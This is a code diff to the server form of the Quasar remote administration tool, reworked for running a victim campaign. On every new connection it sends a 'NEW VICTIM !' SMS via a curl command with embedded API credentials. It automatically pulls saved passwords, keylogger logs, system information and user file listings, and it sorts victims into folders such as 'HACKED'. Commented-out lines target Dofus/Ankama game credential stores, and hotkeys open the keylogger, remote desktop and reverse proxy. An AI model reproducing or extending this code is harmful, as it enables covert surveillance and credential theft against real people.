@@ -13,6 +13,9 @@ using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using IWshRuntimeLibrary;
+using System.Diagnostics;
+using System.Text;
 
 namespace Quasar.Server.Forms
 {
@@ -84,7 +87,7 @@ namespace Quasar.Server.Forms
 #if DEBUG
             serverCertificate = new DummyCertificate();
 #else
-            if (!File.Exists(Settings.CertificatePath))
+            if (!System.IO.File.Exists(Settings.CertificatePath))
             {
                 using (var certificateSelection = new FrmCertificate())
                 {
@@ -153,6 +156,13 @@ namespace Quasar.Server.Forms
         {
             InitializeServer();
             AutostartListening();
+
+            //Sort by Tag
+            ListViewColumnSorter lvwColumnSorter = new ListViewColumnSorter();
+            this.lstClients.ListViewItemSorter = lvwColumnSorter;
+            lvwColumnSorter.SortColumn = 1;
+            lvwColumnSorter.Order = SortOrder.Ascending;
+            this.lstClients.Sort();
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -200,6 +210,55 @@ namespace Quasar.Server.Forms
                     _processingClientConnections = true;
                     ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                 }
+
+                //  _____   ____  ______ _    _  _____ 
+                // |  __ \ / __ \|  ____| |  | |/ ____|
+                // | |  | | |  | | |__  | |  | | (___  
+                // | |  | | |  | |  __| | |  | |\___ \ 
+                // | |__| | |__| | |    | |__| |____) |
+                // |_____/ \____/|_|     \____/|_____/ 
+
+                ////Creation Dossiers Client
+                Directory.CreateDirectory(client.Value.DownloadDirectory);
+
+                //Creation Dossiers Tri
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../HACKED");
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../NEW");
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../NODOFUS");
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER SHIELD");
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER AUTH");
+
+                //Envoi SMS
+                WshShell shell = new WshShell();
+                String msg = "NEW VICTIM !" +
+                        "%0A" + client.Value.UserAtPc +
+                        "%0A" + client.Value.Country
+                        ;
+                String smscommand = "curl -L \"https://smsapi.free-mobile.fr/sendmsg?user=17391631&pass=Llbx1K910z0dVL&msg=" + msg + "\"";
+
+                //Creation raccourci si nouveau
+                String shortcutName = client.Value.UserAtPc + "_" + client.Value.Id.Substring(0, 7) + ".lnk";
+                if (!System.IO.File.Exists(client.Value.DownloadDirectory + "/../../HACKED/" + shortcutName) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
+                {
+                    //WshShell shell = new WshShell();
+                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName);
+                    shortcut.TargetPath = client.Value.DownloadDirectory;
+                    shortcut.Save();
+                    shell.Exec(smscommand);
+                }
+
+                
+
+
+                ////Note détails pigeon dans fichier INFOS.txt
+                //using (FileStream fs = System.IO.File.Create(client.Value.DownloadDirectory + "\\OS.txt"))
+                //{
+                //    Byte[] info = new UTF8Encoding(true).GetBytes(
+                //        client.Value.OperatingSystem);
+                //    // Add some information to the file.
+                //    fs.Write(info, 0, info.Length);
+                //}
+
             }
         }
 
@@ -295,6 +354,36 @@ namespace Quasar.Server.Forms
 
             try
             {
+                String shortcutName = client.Value.UserAtPc + "_" + client.Value.Id.Substring(0, 7) + ".lnk";
+                System.Drawing.Color co = System.Drawing.Color.White;
+                //SET TAG
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName)))
+                {
+                    client.Value.Tag = "2. NEW";
+                    co = System.Drawing.Color.LightGreen;
+                }
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../HACKED/" + shortcutName)))
+                {
+                    client.Value.Tag = "3. HACKED";
+                    co = System.Drawing.Color.LightGoldenrodYellow;
+                }
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)))
+                {
+                    client.Value.Tag = "1.SHIELD";
+                    co = System.Drawing.Color.LightPink;
+                }
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)))
+                {
+                    client.Value.Tag = "0.AUTH";
+                    co = System.Drawing.Color.Cyan;
+                }
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
+                {
+                    client.Value.Tag = "4. NODOFUS";
+                    co = System.Drawing.Color.LightGray;
+                }
+
+
                 // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
@@ -303,11 +392,51 @@ namespace Quasar.Server.Forms
                     client.Value.OperatingSystem, client.Value.AccountType
                 }) { Tag = client, ImageIndex = client.Value.ImageIndex };
 
+                lvi.BackColor = co;
+                
+
                 lstClients.Invoke((MethodInvoker) delegate
                 {
                     lock (_lockClients)
                     {
                         lstClients.Items.Add(lvi);
+
+                        //  _____   ____  ______ _    _  _____ 
+                        // |  __ \ / __ \|  ____| |  | |/ ____|
+                        // | |  | | |  | | |__  | |  | | (___  
+                        // | |  | | |  | |  __| | |  | |\___ \ 
+                        // | |__| | |__| | |    | |__| |____) |
+                        // |_____/ \____/|_|     \____/|_____/ 
+
+                        Client[] clients = new Client[] { client };
+
+                        
+
+                        //passwords
+                            FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
+                        frmPass.RecoverPasswords();
+
+                        ////logs
+                        FrmKeylogger frmKeylogger = FrmKeylogger.CreateNewOrGetExisting(client);
+                        frmKeylogger._keyloggerHandler.RetrieveLogs();
+
+                        ////infos system
+                        FrmSystemInformation frmSi = new FrmSystemInformation(client);
+                        frmSi._sysInfoHandler.RefreshSystemInformation();
+
+                        //files
+                        FrmFileManager frmFM = new FrmFileManager(client);
+                        frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users");
+                        frmFM._fileManagerHandler.GetDirectoryContents("C:\\Windows\\Temp");
+
+                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\Dofus");
+                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap");
+                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\keydata");
+                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\certificate");
+                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE");
+
+                        //frmFM._fileManagerHandler.BeginUploadFile("pssuspend.exe", "C:\\pssuspend.exe");
+
                     }
                 });
 
@@ -439,8 +568,8 @@ namespace Quasar.Server.Forms
                     if (c == null || c.Value == null) return;
                     
                     notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
-                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
-                        c.Value.OperatingSystem), ToolTipIcon.Info);
+                        string.Format("IP Address: {0}\nUser@PC: {1}", c.EndPoint.Address.ToString(),
+                        c.Value.UserAtPc), ToolTipIcon.Info);
                 });
             }
             catch (InvalidOperationException)
@@ -773,5 +902,128 @@ namespace Quasar.Server.Forms
         }
 
         #endregion
+
+        #region "Shortcuts"
+
+        private void lstClients_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (e.KeyChar == (char)Keys.Enter)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (Client c in GetSelectedClients())
+                    {
+                        if (!Directory.Exists(c.Value.DownloadDirectory))
+                            Directory.CreateDirectory(c.Value.DownloadDirectory);
+
+                        Process.Start(c.Value.DownloadDirectory);
+                    }
+                }
+            }
+            else if (e.KeyChar == "k"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmKeylogger frmKL = FrmKeylogger.CreateNewOrGetExisting(c);
+                    frmKL.Show();
+                }
+            }
+            else if (e.KeyChar == "d"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmRemoteDesktop frmRDP = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                    frmRDP.Show();
+                }
+            }
+            else if (e.KeyChar == "p"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
+                    frmRS.Show();
+                }
+            }
+            else if (e.KeyChar == "f"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmFileManager frmFM = FrmFileManager.CreateNewOrGetExisting(c);
+                    frmFM.Show();
+                }
+            }
+            else if (e.KeyChar == "x"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    Process.Start(c.Value.DownloadDirectory + "\\passwords.txt");
+                }
+
+            }
+        }
+
+        #endregion
+
+        private void lstClients_KeyPress_1(object sender, KeyPressEventArgs e)
+        {
+            if (e.KeyChar == (char)Keys.Enter)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (Client c in GetSelectedClients())
+                    {
+                        if (!Directory.Exists(c.Value.DownloadDirectory))
+                            Directory.CreateDirectory(c.Value.DownloadDirectory);
+
+                        Process.Start(c.Value.DownloadDirectory);
+                    }
+                }
+            }
+            else if (e.KeyChar == "k"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmKeylogger frmKL = FrmKeylogger.CreateNewOrGetExisting(c);
+                    frmKL.Show();
+                }
+            }
+            else if (e.KeyChar == "d"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmRemoteDesktop frmRDP = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                    frmRDP.Show();
+                }
+            }
+            else if (e.KeyChar == "p"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
+                    frmRS.Show();
+                }
+            }
+            else if (e.KeyChar == "f"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    FrmFileManager frmFM = FrmFileManager.CreateNewOrGetExisting(c);
+                    frmFM.Show();
+                }
+            }
+            else if (e.KeyChar == "x"[0])
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    Process.Start(c.Value.DownloadDirectory + "\\passwords.txt");
+                }
+
+            }
+        }
+
+        private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
     }
 }
